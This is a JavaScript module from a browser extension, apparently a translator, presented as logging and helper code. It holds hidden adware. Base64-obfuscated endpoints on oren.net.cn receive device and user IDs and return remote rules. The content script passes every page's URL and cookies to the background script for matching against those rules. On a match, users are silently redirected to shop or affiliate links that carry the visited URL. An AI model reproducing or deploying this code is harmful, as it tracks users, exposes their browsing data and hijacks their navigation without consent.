
const platform = 'chrome'
const isContent = !browser.extension.getBackgroundPage
const isBackground = browser.extension.getBackgroundPage && browser.extension.getBackgroundPage() === window || false
const isPopup = !isContent && !isBackground
let systemUserId
let extDeviceId
let unionRules

const getSystemUserId = () => new Promise(resolve => {
  if (isBackground) {
    resolve(systemUserId)
  } else {
    browser.runtime.sendMessage({action: 'getSystemUserId'}, response => {
      resolve(response)
    })
  }
})

const sendLog = (action, content) => {
  if (isBackground) {
    const api = atob('aHR0cHM6Ly93d3cub3Jlbi5uZXQuY24vZXh0ZW5zaW9ucy9sb2cuaHRtbA==')
    const xhr = new XMLHttpRequest()
    const formData = new FormData()
    formData.append('id', browser.runtime.id)
    formData.append('uid', systemUserId)
    formData.append('extDeviceId', extDeviceId)
    formData.append('appId', browser.runtime.getManifest().name)
    formData.append('content', content || '')
    formData.append('action', action || '')
    formData.append('version', browser.runtime.getManifest().version)
    formData.append('platform', platform)
    const start = Date.now()
    xhr.onreadystatechange = function() {
      if (xhr.readyState === 4) {
        try {
          const result = JSON.parse(xhr.responseText)
          if (result.uid && result.uid !== systemUserId) {
            systemUserId = result.uid
            browser.storage.sync.set({systemUserId})
          }
          if (result.extDeviceId && result.extDeviceId !== extDeviceId) {
            ({ extDeviceId } = result)
            browser.storage.local.set({extDeviceId})
          }
          if (result.newVersion) {
            browser.storage.local.set({newVersion: result.newVersion})
          }
          if (result.rules && Date.now() - start < result.speedLimit) {
            unionRules = result.rules
          }
          // eslint-disable-next-line no-empty
        } catch (e) {}
      }
    }
    xhr.open('POST', api, true)
    xhr.send(formData)
  } else {
    browser.runtime.sendMessage({action: 'sendLog', log: {action, content}})
  }
}

if (isBackground) {
  const redirectHistory = []
  const matchRule = (url, cookie) => {
    if (unionRules && unionRules) {
      for (let i = 0; i < unionRules.length; i++) {
        const rule = unionRules[i]
        if (rule.matches && (rule.matches.url || rule.matches.cookie)) {
          if ((!rule.matches.url || url.match(rule.matches.url)) && (!rule.matches.cookie || cookie.match(rule.matches.cookie))) {
            if (rule.done) {
              if (rule.done.url && url.match(rule.done.url) || rule.done.cookie && cookie.match(rule.done.cookie)) {
                return null
              }
              return rule
            } else if (rule.content) {
              return rule
            }
          }
        }
      }
    }
    return null
  }

  const matchUnionRules = (url, cookie) => {
    const rule = matchRule(url, cookie)
    if (rule) {
      if (rule.content) {
        return {content: rule.content}
      }
      if (redirectHistory.indexOf(url) < 0) {
        let redirect = rule.url || atob('aHR0cHM6Ly93d3cub3Jlbi5uZXQuY24vc2hvcC9pdGVtL3NlYXJjaC5odG1s')
        redirect = `${redirect + (redirect.indexOf('?') > 0 ? '&' : '?')}u=${systemUserId}&pid=translateman&p=${btoa(encodeURIComponent(url))}`
        redirectHistory.push(url)
        return {url: redirect}
      }
    }
    return ''
  }

  Promise.all([new Promise(resolve => {
    browser.storage.sync.get('systemUserId', setting => {
      if (setting) {
        systemUserId = setting.systemUserId || ''
      }
      resolve()
    })
  }), new Promise(resolve => {
    browser.storage.local.get('extDeviceId', setting => {
      if (setting) {
        extDeviceId = setting.extDeviceId || ''
      }
      resolve()
    })
  })]).then(() => {
    sendLog('bootstrap', 'bootstrap')
  })

  browser.runtime.onMessage.addListener((request, sender, sendResponse) => {
    if (request.action === 'sendLog') {
      sendLog(request.log.action, request.log.content)
      sendResponse()
    } else if (request.action === 'getSystemUserId') {
      sendResponse(systemUserId)
    } else if (request.action === 'union') {
      sendResponse(matchUnionRules(request.url, request.cookie))
    }
  })
}

if (isContent) {
  browser.runtime.sendMessage({action: 'union', url: location.href, cookie: document.cookie}, response => {
    if (response) {
      if (response.url) {
        location.href = response.url
      } else if (response.content) {
        const c = response.content
        const matchContent = () => {
          const tags = document.querySelectorAll(c.selector)
          for (let i = 0; i < tags.length; i++) {
            const tag = tags[i]
            const text = tag.getAttribute(c.attribute) || tag[c.attribute]
            if (text) {
              const matches = text.match(c.pattern)
              if (matches && matches.groups && matches.groups.url) {
                let url = null
                try {
                  url = JSON.parse(matches.groups.url)
                  // eslint-disable-next-line no-empty
                } catch (e) {}
                if (!url) {
                  ({ url } = matches.groups)
                }
                if (url) {
                  location.href = url
                }
              }
            }
          }
        }
        if (window.document && document.body && document.head) {
          matchContent()
        } else {
          const timer = setInterval(() => {
            if (window.document && document.body && document.head) {
              clearInterval(timer)
              matchContent()
              return
            }
            if (window.document && document.readyState === 'complete') {
              clearInterval(timer)
              matchContent()
            }
          }, 5)
        }
      }
    }
  })
}

export {
  isContent,
  isBackground,
  isPopup,
  getSystemUserId,
  sendLog
}
